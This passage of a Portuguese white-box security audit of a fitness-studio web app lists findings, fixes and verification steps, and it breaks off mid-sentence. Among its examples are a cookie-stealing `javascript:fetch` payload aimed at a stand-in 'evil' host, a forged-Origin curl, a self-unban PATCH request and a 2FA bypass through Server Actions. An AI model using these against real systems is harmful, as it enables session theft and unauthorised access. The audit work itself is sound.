# LEAP Fitness Studio · Auditoria de Segurança

> White-box review. IDs estáveis (`S-XX`) — runs futuros mantêm IDs e só
> flipam Status / acrescentam novos findings.
> Severidade: Critical / High / Medium / Low / Info.
> Status: OPEN / IN PROGRESS / FIXED / ACCEPTED.
>
> Último run: 2026-06-23 (re-audit white-box exaustivo. S-01..S-15 reverificados
> e mantidos FIXED/ACCEPTED; S-16 e S-17 confirmados ainda OPEN. **Novo achado
> material: S-18 (Medium) — broken access control / mass-assignment na tabela
> `profiles`: um cliente pode auto-modificar `banned` (self-unban) e `trainer_id`
> (self-rescope) via PostgREST directo. FIXED neste run** com a migration
> `0110_protect_profile_banned_and_trainer.sql` (estende o trigger
> `protect_profile_role`). Run anterior 2026-06-22 acrescentou S-16/S-17.

## Resumo executivo

Postura geral **boa**. As fronteiras de autorização foram cobertas em
runs anteriores (H-A/H-B/H-C/H-D, C-A/C-B/C-C, S-01..S-12) e a maioria
das Server Actions usam `requireStaff`/`requireOwner` + checks
explícitos de ownership sobre o `trainer_id` vindo do form. RLS está
activo em todas as tabelas sensíveis e os RPCs críticos são
`SECURITY DEFINER` com guards internos (`_is_service_or_admin`,
`_trainer_is_accessible`, ownership por `auth.uid()`) — verificado em
0015/0042 neste run.

**Run 2026-06-23 (este run).** O achado material novo é **S-18 (Medium)**:
a policy RLS `profiles: self update` (0003) permite ao utilizador escrever
**qualquer coluna** da sua própria linha, e o único guard de coluna
(`protect_profile_role`) só protegia `role`. As colunas `banned` (0066) e
`trainer_id` (0001) ficaram desprotegidas → um cliente suspenso anula a sua
própria suspensão (`PATCH /rest/v1/profiles?id=eq.<self> {"banned":false}`
com a anon key pública) e volta a comprar packs; e pode auto-associar-se a
um trainer arbitrário (`trainer_id`), injectando-se no scope/PII de outro
trainer via `_client_is_accessible`. **Fechado neste run** com a migration
`0110` que estende o trigger para bloquear self-write de `banned`/`trainer_id`
(staff-only) mantendo `role` owner-only. Restantes fronteiras (RPCs
financeiras/agenda com `_is_service_or_admin()` + `_trainer_is_accessible()`,
RLS, CSP nonce, 2FA no boundary de dados S-13) reverificadas e de pé.

O achado material do run de 2026-06-18 foi **S-13 (High)**: o gate de
**2FA estava implementado SÓ no `app/admin/layout.tsx`**. Como as Server
Actions são endpoints POST que NÃO renderizam o layout, uma sessão
**AAL1** (password correcta, sem TOTP — exactamente o cenário que o 2FA
existe para travar) podia invocar **todas** as actions de staff
directamente (apagar cliente, atribuir/remover créditos, cancelar
sessões, conceder/revogar admin). `is_admin()` nas RPCs também devolve
`true` em AAL1, por isso a camada de dados não apanhava o gap. **Fechado
neste run** movendo o gate de 2FA para `lib/authz.ts`
(`requireStaff`/`requireOwner` passam a exigir AAL2-ou-trusted-device
quando o caller tem factor verificado, replicando o layout). Acrescentam-se
ainda dois itens de defesa-em-profundidade, **ambos fechados neste run**:
**S-14 (Low → FIXED)** — `getRequestIp` aceitava `x-forwarded-for` forjável
como fallback (mitigado no Vercel; agora pinado a `x-vercel-forwarded-for`
com fail-closed em prod); e **S-15 (Info → FIXED)** — upload de avatar
validava só o MIME declarado pelo cliente (mitigado por bucket em origem
separada `*.supabase.co` + `nosniff` + allowlist sem SVG; agora também
valida magic-bytes).

**Run 2026-06-22 (este run).** Re-walk completo da checklist de cobertura
(AuthN, AuthZ/IDOR, injection, XSS, CSRF, secrets, rate-limit, exposição de
dados, headers, deps, uploads, lógica de negócio). Confirmado que as fronteiras
de autorização continuam de pé na **camada de dados**: todas as RPCs financeiras
e de agenda (`adjust_credits`, `confirm_purchase`, `create_purchase`,
`create_custom_purchase`, `cancel_booking`, `mark_no_show`,
`confirm_booking_attendance`) validam `_is_service_or_admin()` **E**
`_trainer_is_accessible(trainer_id)` — bloqueando IDOR cross-trainer mesmo que
um trainer chame a action com IDs de outro trainer (verificado em
`0027_multi_trainer_scope.sql`). As rotas que recebem um id do cliente
(`/api/bookings/[id]/ics`, `/app/compras/[id]/manual`, ratings, notas) reforçam
ownership com `.eq("client_id", user.id)` + RLS. O JWT é verificado
criptograficamente (`getClaims`, ES256 local) e Supabase revalida-o em cada
query PostgREST — `getSession()`/`getSessionUser()` (só-cookie) nunca é a única
barreira porque a query subsequente vai com o mesmo JWT que o servidor valida.

Os **dois achados novos são ambos baixos** e não exploráveis sem outra
pré-condição: **S-16 (Low)** — `npm audit` agora reporta 7 advisories
(postcss `<8.5.10`, uuid `<11.1.1` via exceljs, glob via eslint-config-next),
quase todas dev/build-time; só o uuid corre em runtime (via exceljs nos exports)
e a CVE só dispara com `buf` passado, o que o exceljs não faz. **S-17 (Info)** —
os `access_token`/`refresh_token` de Google/Microsoft Calendar são guardados em
claro em `calendar_integrations` (defesa-em-profundidade: cifrar em repouso).
Nenhum dos dois foi alterado neste run — requerem decisão (bump de deps
potencialmente breaking / mudança de schema). Ver detalhe + remediação.

A correcção do S-13 não altera o fluxo normal: um staff que fez login e
completou o 2FA está em AAL2 (ou tem cookie trusted-device), por isso
`requireStaff`/`requireOwner` passam sem custo extra (sessões AAL2 ou
sem 2FA nem tocam na BD — `getAalInfo` é local e cached por request).
Só a sessão AAL1-com-2FA-pendente é recusada — idêntico ao que o layout
já fazia, agora também no boundary de dados.

> **Baseline determinístico (2026-06-22):** `next@^16.2.9` + `react@^19.2.7`
> confirmados em `package.json` → **S-02 mantém-se fechado na raiz**.
> `npm audit` correu neste run: **7 advisories (4 moderate, 3 high)**, todas
> transitivas e nenhuma RCE/escalada — ver **S-16**:
>   • `postcss <8.5.10` (moderate, GHSA-qx2v-qp2m-jg93, XSS no stringify) —
>     puxado pelo `next` bundled e pela devDep directa; build-time.
>   • `uuid <11.1.1` (moderate, GHSA-w5hq-g745-h8pq) via `exceljs`; runtime nos
>     exports, mas a CVE só dispara com `buf` fornecido (exceljs não fornece).
>   • `glob 10.2.0–10.4.x` (high, GHSA-5j98-mcp5-4vw2, command-injection no
>     CLI `-c`) via `@next/eslint-plugin-next`→`eslint-config-next`; dev-only,
>     não há invocação do CLI do glob no código.
> Greps de baseline (sem novos sinks):
>   • `dangerouslySetInnerHTML` → 3 usos, todos com escape verificado
>     (`jsonLdSafe` em `/t/[slug]`, `extractSvgInline` no enroll-card, e o
>     `<script>` do SW com nonce em `app/layout.tsx`).
>   • `SUPABASE_SERVICE_ROLE_KEY` → 3 ficheiros server-only
>     (`lib/supabase/server.ts`, `clientes/[id]/actions.ts`, `perfil/actions.ts`).
>   • `.env*.local` git-ignorado e **nunca** presente no histórico git
>     (`git log --all` limpo); zero JWTs/keys hardcoded em `app/lib/components`.
>   • Sem `fetch()` de URL controlado pelo cliente (SSRF): calendar-sync usa
>     endpoints fixos de Google/Microsoft, `calendar_id` é `"primary"`.
> `tsc --noEmit` não é fiável neste sandbox (mount FUSE corrompe leituras
> UTF-8 com acentos → erros-fantasma); correr `npm run type-check` na máquina
> como fonte de verdade.

## Findings — Índice

| ID | Severidade | CWE | Título | Exploitability | Status |
|----|-----------|-----|-------|---------------|--------|
| S-01 | High | CWE-639 / CWE-89 | Pesquisa admin `/admin/clientes?q=` sem scope + sem escape de separadores PostgREST → PII leakage cross-trainer e filter injection | Autenticado, trainer | FIXED |
| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) | Anónimo, internet | FIXED (upgrade `next@^16.2.9`) |
| S-03 | Medium | CWE-352 | `/api/notifications/read` aceita POST sem Origin check — defense-in-depth | Cross-site (SameSite=Lax mitiga) | FIXED |
| S-04 | Medium | CWE-79 | Loja: `<a href={p.link_url}>` sem validação de scheme em `/app/loja/[categoria]` — `javascript:`/`data:` possíveis | Autenticado, trainer malicioso | FIXED |
| S-05 | Medium | CWE-613 | Cache de claims no middleware (30s) pode servir auth stale após expiração do JWT dentro da janela | Necessita JWT a expirar dentro da janela | ACCEPTED (justificado em-código) |
| S-06 | Low | CWE-639 | `markReadAction`/`deleteNotificationAction` sem filtro explícito `user_id` — RLS protege, mas defense-in-depth | Autenticado | FIXED |
| S-07 | Low | CWE-79 | `enroll-card.tsx::extractSvg` constrói `<img src="${src}">` por template literal — defense-in-depth | Server-controlled (Supabase) | FIXED |
| S-08 | Low | CWE-79 | `email.ts::ratingPrompt` interpola `link` no `href` sem escape de aspas — defense-in-depth | Server-controlled (env) | FIXED |
| S-09 | Info | CWE-770 | `middleware.ts::claimsCache` poda só ao chegar a 500 entradas | Local à instância edge | ACCEPTED |
| S-10 | Medium | CWE-285 / CWE-862 | `app/admin/agenda/actions.ts` — 11 Server Actions sem `requireStaff()` no boundary. Único ficheiro `app/admin/**/actions.ts` sem o guard explícito. Defense-in-depth ausente. | Autenticado (cliente) | FIXED |
| S-11 | Low | CWE-778 | `/api/me/export` (XLSX dos meus dados RGPD) não regista evento no audit log; assimetria com `/api/relatorios/export` | Autenticado (próprio user) | FIXED |
| S-12 | Low | CWE-525 | `/api/slots` devolve `Cache-Control: public, s-maxage=30` mas a rota está fora de `isPublic` no middleware → Vercel Edge cacheia para qualquer origem incluindo unauth (dados não são PII, mas inconsistência de policy) | Anónimo | FIXED |
| S-13 | High | CWE-306 / CWE-862 | Gate de 2FA só no `app/admin/layout.tsx` — Server Actions de staff (apagar cliente, créditos, cancelar sessões, conceder admin) invocáveis em sessão AAL1, contornando o TOTP. `requireStaff`/`requireOwner` e `is_admin()` só checavam role, não AAL. | Autenticado staff em AAL1 (password comprometida, sem 2º factor) | FIXED |
| S-14 | Low | CWE-348 | `getRequestIp` (`lib/rate-limit.ts:141`) aceita `x-forwarded-for`/`x-real-ip` forjáveis como fallback → rotação da chave de rate-limit / bypass de brute-force se `x-vercel-forwarded-for` faltar | Anónimo (só fora do Vercel) | FIXED |
| S-15 | Info | CWE-434 | Upload de avatar (`app/admin/definicoes/actions.ts:303-315`) valida só o `file.type` declarado pelo cliente, sem magic-bytes | Autenticado staff (próprio trainer) | FIXED |
| S-16 | Low | CWE-1395 / CWE-1104 | `npm audit`: 7 advisories transitivas (`postcss<8.5.10`, `uuid<11.1.1` via exceljs, `glob` via eslint-config-next). Build/dev-time na maioria; uuid em runtime mas não disparável (exceljs não passa `buf`) | Anónimo (teórico) / dev | OPEN |
| S-17 | Info | CWE-312 | Tokens OAuth de calendário (`access_token`/`refresh_token` Google/Microsoft) guardados em claro em `calendar_integrations` (`api/integrations/[provider]/callback/route.ts:67-79`) | Requer compromisso da BD / service-role | OPEN (defesa-em-profundidade) |
| S-18 | Medium | CWE-639 / CWE-915 | `profiles: self update` (RLS, 0003) permite self-write de `banned` (self-unban → contorna a suspensão de compras) e `trainer_id` (self-rescope → injecção no scope/PII de outro trainer); trigger só protegia `role` | Autenticado low-priv (só anon key pública + JWT próprio) | FIXED (migration 0110) |

## Controlos JÁ em vigor (não voltam a ser flagged)

Lista do que está **bem feito** para evitar re-flag em runs futuros.

- **JWT verificado, não só descodificado**. Middleware (`lib/supabase/middleware.ts:121`)
  e Server Components (`lib/supabase/server.ts:60-64 getClaimsUser`) usam
  `supabase.auth.getClaims()` — verificação ES256 LOCAL contra JWKS, não um
  simples decode. `getSessionUser()` (que só lê cookie) está documentado como
  trade-off PERF onde a chamada upstream já validou.
- **Authz boundary explícita em Server Actions críticas**. `lib/authz.ts`
  exporta `requireStaff`/`requireOwner` que são chamados ao topo de TODAS
  as actions admin (após o fix S-10, agora também em `app/admin/agenda/actions.ts`).
  Acções destrutivas (apagar/banir cliente, cancelar pagamento confirmado)
  exigem `requireOwner` (least privilege).
- **Multi-trainer scope** em RPCs e helpers: `getAccessibleTrainerIds`,
  `getClientIdsInScope`, e `_trainer_is_accessible(trainer_id)` em RLS
  policies. `searchClientsAction` (C-A audit) e a pesquisa em
  `/admin/clientes?q=` (S-01 audit) filtram por scope.
- **RLS activo em todas as tabelas** (110 migrations) com policies por papel
  (`supabase/migrations/0003_rls_policies.sql` + hardening em 0015, 0027,
  0028, 0029, 0030, 0049, 0078, 0081, 0083, 0110).
- **Colunas sensíveis de `profiles` protegidas por trigger** contra self-write
  via PostgREST: `role` owner-only (0050), `banned`/`trainer_id` staff-only
  (0110, S-18). A self-update policy permanece por-linha, mas estas colunas já
  não são mass-assignáveis pelo próprio cliente.
- **CSP nonce-based** (`lib/security-headers.ts`) com `'strict-dynamic'`,
  `frame-ancestors 'none'`, `form-action 'self'`, `upgrade-insecure-requests`.
  HSTS 2 anos + preload, X-Frame-Options DENY, X-Content-Type-Options nosniff,
  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin,
  Permissions-Policy fechada (`next.config.mjs:64-104`).
- **Anti-enumeração** em `/registar` e `/recuperar` (sempre redirect "sucesso"
  independentemente do email existir — H-B audit, `app/registar/actions.ts:51-61`).
- **Open-redirect**: `isSafePath`/`safePathOr` aplicados em `/auth/callback`,
  `/login`, `/login/2fa`, `/app/perfil/seguranca` (whitelist `safeReturn`).
- **Rate-limit** Upstash com fallback in-memory; aplicado a `/login`,
  `/registar`, `/recuperar`, `/auth/reset`, `/api/slots`, `/api/bookings/*/ics`,
  `/api/notifications/read`, exports (`/api/me/export`, `/api/relatorios/export`),
  webhooks, e `/api/calendar/feed/[token]` (H-D).
- **Constant-time secret comparison** (`lib/secrets.ts::verifyBearer`) usado
  em todos os crons + push dispatch.
- **OAuth state**: `/api/integrations/[provider]/connect` gera nonce 256-bit,
  guarda `userId:provider:nonce` em cookie HttpOnly, valida com `timingSafeEqual`
  no `/callback` e exige `user.id === storedUserId`.
- **CSRF em disconnect e notifications**: `/api/integrations/[provider]/disconnect`
  e `/api/notifications/read` (S-03) validam `Origin === host`.
- **JSON-LD safe** em `/t/[slug]` — `jsonLdSafe` escapa `<>&  ` para
  prevenir breakout de `</script>` (C1 audit).
- **MFA re-auth ("sudo")**: enroll do primeiro factor exige re-confirmar
  password; unenroll exige challenge TOTP fresco — não basta cookie/trusted
  device (H-A audit, `app/app/perfil/seguranca/actions.ts`).
- **2FA enforced NO BOUNDARY de dados** (S-13, este run): `requireStaff`/
  `requireOwner` (`lib/authz.ts`) exigem AAL2-ou-trusted-device quando o
  caller tem factor verificado — não só o `app/admin/layout.tsx`. O gate
  deixa de depender de o atacante "passar pelo layout".
- **Auth boundary verificada server-side, não só descodificada** (RPCs):
  `0015_security_harden_rpcs.sql` usa `_is_service_or_admin()` (que exige
  `is_admin()` ou service-role) e `0042` valida `client_id = auth.uid()` ou
  `is_admin() AND _trainer_is_accessible(...)` ANTES de qualquer mutação —
  IDOR de reschedule/cancel/confirm/no-show fechado na BD (re-verificado).
- **Service role** confinado a 3 ficheiros (`lib/supabase/server.ts`,
  `app/admin/clientes/[id]/actions.ts`, `app/app/perfil/actions.ts`) — todos
  em código server-only, sempre após `requireOwner`/check explícito de ownership.
- **iCal feed** com UUID v4 estrito + rate-limit dedicado (H-D audit).
- **PII export** com janela limitada a 366 dias, rate-limit `export`, fail-closed
  no audit-log, defesa contra CSV injection (`esc()` neutraliza `=+-@` no
  primeiro carácter).
- **GDPR / direito ao apagamento** via `anonymize_my_account` /
  `anonymize_client_account` + ban subsequente do auth user via service role.
- **Password policy**: mínimo 8 chars no signup/reset/change.
- **Avatar/file uploads**: validação server-side de mime + size (2 MB avatars,
  5 MB store/slideshow), nomes derivados do mime (não do filename original).
  Bucket Supabase aplica `allowed_mime_types` server-side (camada extra).
- **Trainer bio + nome** com strip de `<>` (defense-in-depth contra JSON-LD).
- **Anti-enumeração no register**: trainer_id do form é validado com
  `UUID_RE` e existência+`active=true` antes de propagar a user_metadata.
- **`type-check` bloqueia o build** (`next.config.mjs`): `ignoreBuildErrors`
  voltou a `false` em jun/2026 — actions sem o guard `requireStaff/Owner`
  e retornos mal tipados deixam de passar CI.

## Findings — Detalhe

### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High → FIXED]`

**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-121`

**Vulnerabilidade (original):** Quando o admin pesquisa via `?q=…`, a
página construía a query Supabase como:

```ts
const safe = q.replace(/[%_]/g, (m) => `\\${m}`);
supabase.from("profiles")
  .select("id, full_name, email, phone", { count: "exact" })
  .eq("role", "client")
  .or(`full_name.ilike.%${safe}%,email.ilike.%${safe}%,phone.ilike.%${safe}%`)
  ...
```

Dois problemas:

1. **PII leakage cross-trainer.** Sem filtro de scope, num estúdio
   multi-trainer um trainer (que é `is_admin()`) recebia clientes de
   outro trainer no mesmo `profiles select` policy. Iterando `?q=a..z`,
   enumeração completa nome+email+telefone.
2. **Filter injection na sintaxe `.or()` do PostgREST.** O escape só
   tratava `%_` (wildcards ILIKE) e não os separadores `,()` da
   gramática `or()`.

**Fix aplicado:** restringir aos clientes do scope via
`getClientIdsInScope`; escapar `[%_,()]` em vez de só `[%_]`. Diff visível
no ficheiro indicado.

**Verificação:** num estúdio com ≥2 trainers, login como trainer A e
abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes do
trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
confirmar que devolve resultados normais (o `)` foi escapado).

---

### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High → FIXED]`

**Ficheiro/linhas:** `package.json:20`

**Vulnerabilidade (original):** `npm audit` em 14.2.33 reportava
GHSA-9g9p-9gw9-jx7f (DoS Image Optimizer), GHSA-h25m-26qc-wcjf (DoS
deserialização RSC), GHSA-ggv3-7p47-pfv8 (request smuggling em
rewrites), GHSA-3x4c-7xq6-9pq8 (disk cache `next/image`),
GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj (DoS Server Components). Todas
DoS — sem leak de dados / RCE / escalada de privilégios.

**Status (2026-06-17, este run):** **FIXED na raiz**. `package.json`
está em `next@^16.2.9` + `react@^19.2.7`. As CVEs acima são todas em
linhas Next 14 (≤15.x para algumas), corrigidas antes de 16.x. A
mitigação edge anteriormente listada (Upstash + Vercel WAF) deixa de ser
contingência e passa a defesa em profundidade.

**Como verificar:**
```bash
npx next --version   # 16.x
npm audit            # zero advisories críticos relacionados com next
```

**Nota operacional:** com Next 16, `cookies()`/`headers()` passaram a
ser síncronos onde antes podiam ser async. O codemod
`@next/codemod next-async-request-api` foi corrido em jun/2026 — a árvore
de código actual está coerente. Em PRs futuros, evitar voltar a usar a
forma async/await sobre `cookies()`/`headers()`.

---

### S-03 · Falta Origin check em `/api/notifications/read` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/api/notifications/read/route.ts:25-37`

Endpoint POST com cookie de sessão. SameSite=Lax já mitiga, mas
faltava a verificação explícita `Origin === host` que já existe em
`/api/integrations/[provider]/disconnect`. Defense-in-depth trivial.

**Fix aplicado:** validação `new URL(origin).host === host` antes de
tocar na BD; rejeita 403 em mismatch.

**Verificação:** `curl -X POST <app>/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` → 403.

---

### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:18-21,57-95`,
`app/admin/loja/actions.ts:35-46,101-106,170-174`

React não bloqueia `javascript:` / `data:` em `<a href>`. Sem validação
no Server Action, staff/trainer malicioso (ou conta admin comprometida)
podia gravar `link_url=javascript:fetch('//evil/'+document.cookie)` num
produto da loja → executa no contexto de qualquer cliente que clique.

**Fix aplicado:** `safeHttpUrl()` igual ao já usado em promo banners +
guard `safeHref()` na page para proteger dados antigos.

**Verificação:** admin → Loja → criar produto com
`link_url=javascript:alert(1)` → action devolve "Link inválido". Em BD
seedada com `javascript:` (manual), página renderiza card sem `<a>`.

---

### S-05 · Claims cache do middleware pode servir auth stale (30s) `[Medium → ACCEPTED]`

**Ficheiro/linhas:** `lib/supabase/middleware.ts:18-21, 113-131`

Cache TTL 30s por fingerprint do cookie. Se o cookie não rodar mas o
JWT expirar dentro da janela, o valor cached é servido até 30s além de
expirar. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip ao
GoTrue) → não afectados. Re-flag se a app passar a suportar revogação
instantânea como requisito.

---

### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-22`, `:24-45`

RLS protege hoje, mas o filtro `.eq("user_id", user.id)` explícito
elimina o risco de despromoção da policy numa migration futura.

**Verificação:** unit test (manual) — em local com RLS desligado, tentar
`markReadAction("<id-de-outro-user>")` → nada acontece.

---

### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:99-111,167-188`

O fallback de `<img src=...>` deixou de usar template literal —
renderizado por React (escape nativo de atributos). O caminho quente
(`startsWith("<svg")`) mantém-se inalterado.

---

### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low → FIXED]`

**Ficheiro/linhas:** `lib/email.ts:209-227`

`href="${escapeHtml(link)}"` em vez de `href="${link}"`. Defense-in-depth
contra `appUrl` mal configurada (`"` no URL parte o atributo).

---

### S-09 · Cache do middleware sem cap proactivo `[Info → ACCEPTED]`

`pruneClaimsCache` só corre quando `Map.size > 500`. Cada entrada é
leve (string + objecto pequeno), TTL 30s, V8 isolate do Edge é cíclico.

---

### S-10 · Server Actions de agenda sem `requireStaff()` no boundary `[Medium → FIXED]`

**Ficheiro/linhas:** `app/admin/agenda/actions.ts:60-72, 80-121, 123-134,
138-156, 158-183, 185-213, 226-406, 414-472, 474-518, 533-639, 644-675,
678-714, 724-766, 769-784`

**Vulnerabilidade:** Server Actions em `app/admin/**/actions.ts` seguem
o padrão de defense-in-depth definido em `lib/authz.ts`: chamar
`requireStaff()` (ou `requireOwner()`) ao topo da função, antes de
qualquer RPC ou query. O grep confirma — 8 dos 9 ficheiros de actions
admin têm o import:

```
app/admin/loja/actions.ts        ✓
app/admin/equipa/actions.ts      ✓
app/admin/pagamentos/actions.ts  ✓
app/admin/packs/actions.ts       ✓
app/admin/promocoes/actions.ts   ✓
app/admin/clientes/search-action.ts ✓
app/admin/definicoes/actions.ts  ✓
app/admin/clientes/[id]/actions.ts  ✓
app/admin/agenda/actions.ts      ✗  ← o único sem guard
```

As 11 actions exportadas de `agenda/actions.ts` (confirmAttendance,
updateBookingDuration, markNoShow, revertNoShow, cancelAdmin,
deleteBlock, createAgendaBooking, rescheduleBookingAdmin,
addBlockQuick, createBusy, deleteRecurringBlock, updateBlock,
updateRecurringBlock, skipRecurringDate) confiavam EXCLUSIVAMENTE em:

1. RPC `SECURITY DEFINER` para os caminhos que chamam Postgres
   (confirm_booking_attendance, mark_no_show, cancel_booking, …),
2. `getAccessibleTrainerIds()` retornar `[]` para clientes (alguns
   handlers usam isto para validar `trainerId` do form),
3. RLS para os `INSERT/UPDATE/DELETE` directos em `trainer_blocked_times`,
   `trainer_recurring_blocks`, etc.

Hoje, isto bloqueia o ataque — RLS rejeita, RPCs definidas em
`0015_security_harden_rpcs.sql` e seguintes verificam staff. Mas o
contrato do `lib/authz` é "guard explícito no boundary, antes de
qualquer side-effect". O gap quebrava esse contrato e arriscava
escalada silenciosa se um único RPC perdesse o guard interno numa
migration futura.

**Ataque hipotético:** assume-se que a migration X relaxa o guard staff
em `cancel_booking` por erro de copy-paste (ex.: copia da versão de
`cancel_booking_self`). Um cliente autenticado faria invoke da
Server Action `cancelAdminAction` com qualquer `bookingId` do estúdio.
Sem `requireStaff()` no boundary, a chamada chega à RPC; com a policy
relaxada, a RPC executa. Result: cliente cancela sessões alheias.

**Impacto residual hoje:** Nenhum (RPCs ainda bloqueiam). Defense-in-
depth para evitar regressões.

**Fix aplicado neste run (2026-06-17):**
- Adicionado `import { requireStaff } from "@/lib/authz";`
- Adicionada chamada `await requireStaff();` no topo de TODAS as 11
  actions do ficheiro. `requireStaff` é cached por request (lê o
  `profile` via `getCurrentProfile` que é `cache()`-wrapped), por isso
  o custo é uma única leitura por request mesmo em fluxos que invocam
  várias actions em sequência (raro).

**Verificação:**
- `grep -n "requireStaff" app/admin/agenda/actions.ts` → 11 ocorrências
  + 1 import.
- Manual: login como cliente, executar `curl` ao endpoint Server Action
  encoded de `markNoShowAction` com `bookingId=<id-de-um-trainer>` →
  Server Action lança "Acesso restrito." (antes lançava o erro da RPC).
- Build (`npm run type-check`) limpo.

---

### S-11 · `/api/me/export` sem audit-log RGPD `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/me/export/route.ts:114-138`

**Vulnerabilidade:** o ficheiro XLSX devolvido contém PII (nome, email,
telemóvel, histórico de sessões, compras, notas). O equivalente para
trainers (`/api/relatorios/export/route.ts:117-128`) regista
`log_audit_event('export_pii', ...)` e falha closed se o audit falhar.
O `/api/me/export` não — assimetria de auditoria que (a) impede
investigação de incidentes ("quem descarregou os meus dados em X data?")
e (b) é exigência implícita do art. 30 RGPD (registo de tratamentos).

**Impacto:** baixo (o próprio user exporta os SEUS dados → consentimento
implícito), mas mais zero auditoria viola política interna.

**Fix aplicado:** chamada não-bloqueante a `log_audit_event` com action
`export_pii_self`, payload com counts por sheet e formato. Best-effort:
o log falhar não bloqueia o download (já existe consentimento implícito
do user) — só fica trail no console error.

**Verificação:** `curl --cookie ... <app>/api/me/export -o /tmp/me.xlsx`
seguido de `select * from audit_log where action='export_pii_self'
order by created_at desc limit 1;` no Supabase SQL Editor.

---

### S-12 · `/api/slots` declara `Cache-Control: public` em rota autenticada `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/slots/route.ts:43-63`

**Vulnerabilidade:** o middleware redirecciona unauth para `/login`
(rota fora de `isPublic`). Mas a resposta saía com
`Cache-Control: public, s-maxage=30, stale-while-revalidate=300` +
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge Cache **serve a
resposta cached antes do middleware correr** num cache hit — i.e., uma
chamada unauth ao endpoint cacheado devolveria os slots sem nunca
passar pela auth check.

Os dados em causa não são PII (apenas time-slots livres do trainer X
no dia Y), e a página `/t/<slug>` é pública/SEO-indexável (revela o
trainer). O risco efectivo é **inconsistência arquitectural** (a rota
diz "auth obrigatória" mas o cache contradiz) + revelação trivial de
disponibilidade de um trainer a anónimos. Low/Info.

**Ataque:** atacante anónimo faz `curl <app>/api/slots?trainer=<uuid>&date=2026-06-20&duration=45`
sem cookie, no momento em que esse trio acabou de ser servido a um user
autenticado nos últimos 30s. Recebe a lista de slots → mapeia a agenda
do trainer sem nunca se autenticar.

**Fix aplicado:** trocado `Cache-Control: public` por `private` (browser-
only, sem proxies/CDNs gerais) e mantido o edge cache via
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge respeita
`CDN-Cache-Control` e mantém a partilha entre clientes legítimos; o
`Cache-Control: private` da resposta impede proxies intermédios
(corporativos, ISPs) de cachear; e o middleware continua a correr antes
do edge cache responder a misses. O ganho PERF do cache mantém-se para
quem está autenticado.

**Verificação:** `curl -i <app>/api/slots?trainer=...&date=...&duration=45`
sem cookie → 307 → `/login`. Resposta autenticada inspeccionada:
`Cache-Control: private, s-maxage=30, ...`, `CDN-Cache-Control: public,
s-maxage=30`.

---

### S-13 · Gate de 2FA só no layout — bypass via Server Action `[High → FIXED]`

**Ficheiro/linhas:** `lib/authz.ts:14-29` (antes do fix), gate original em
`app/admin/layout.tsx:52-56`. Afecta TODAS as Server Actions de staff:
`app/admin/agenda/actions.ts`, `app/admin/clientes/[id]/actions.ts`
(adminDeleteClientAction, setClientBannedAction, grantPackAction,
adjustCreditsAction), `app/admin/equipa/actions.ts` (addTrainer,
grantAdminByEmail, demoteTrainer, makeStudioTrainer…), `app/admin/loja`,
`app/admin/promocoes`, `app/admin/packs`, `app/admin/pagamentos`,
`app/admin/definicoes`.

**Vulnerabilidade:** o desafio de 2FA do staff vivia exclusivamente no
Server Component `app/admin/layout.tsx`:

```ts
const { currentLevel, hasMfa } = await getAalInfo();
if (hasMfa && currentLevel !== "aal2" && !(await isDeviceTrusted(user.id))) {
  redirect(`/login/2fa?next=${...}`);
}
```

`signInWithPassword` estabelece a sessão em **AAL1** ANTES do desafio
TOTP. O layout só corre quando o browser navega para uma página `/admin/*`
e renderiza o layout. Mas as **Server Actions são endpoints POST
independentes** — o Next despacha-as pelo action-id no corpo, sem
renderizar o layout da rota. O guard de dados `requireStaff()`/
`requireOwner()` (e `is_admin()` dentro das RPCs `SECURITY DEFINER`) só
verificava o **role**, nunca o **AAL**. Logo:

- Um atacante com a **password** de um admin (phishing, reuse, leak) mas
  SEM o 2º factor obtém uma sessão AAL1.
- O layout `/admin` redirecciona-o para `/login/2fa` → parece bloqueado.
- Mas ele constrói o POST da Server Action (o payload é serializável e o
  action-id é estável por build) e invoca `adminDeleteClientAction`,
  `grantPackAction`, `cancelAdminAction`, `grantAdminByEmailAction`, etc.
  `requireStaff()` vê `role ∈ {trainer,owner}` → passa. A RPC vê
  `is_admin()` → passa. **O 2FA é completamente contornado** para todas as
  operações destrutivas/financeiras.

**Impacto:** o 2FA — controlo cujo propósito é precisamente proteger
contra password comprometida — não oferece protecção nenhuma às operações
mais sensíveis do painel. Eleva a severidade de qualquer leak de password
de staff a comprometimento total (apagar PII de clientes, falsear
créditos/pagamentos, auto-conceder admin).

**Fix aplicado (2026-06-18):** o gate passou para o boundary de dados em
`lib/authz.ts`. `requireStaff()`/`requireOwner()` chamam agora
`assertMfaSatisfied(profile.id)` depois de validar o role:

```ts
async function assertMfaSatisfied(userId: string): Promise<void> {
  const { currentLevel, hasMfa } = await getAalInfo();
  if (hasMfa && currentLevel !== "aal2" && !(await isDeviceTrusted(userId))) {
    throw new Error("2FA necessária.");
  }
}
```

Replica EXACTAMENTE a condição do layout (mesma política: só staff com
factor verificado é forçado; AAL2 ou trusted-device satisfazem). Custo
nulo no fluxo normal — `getAalInfo` é local (lê o JWT) e cached por
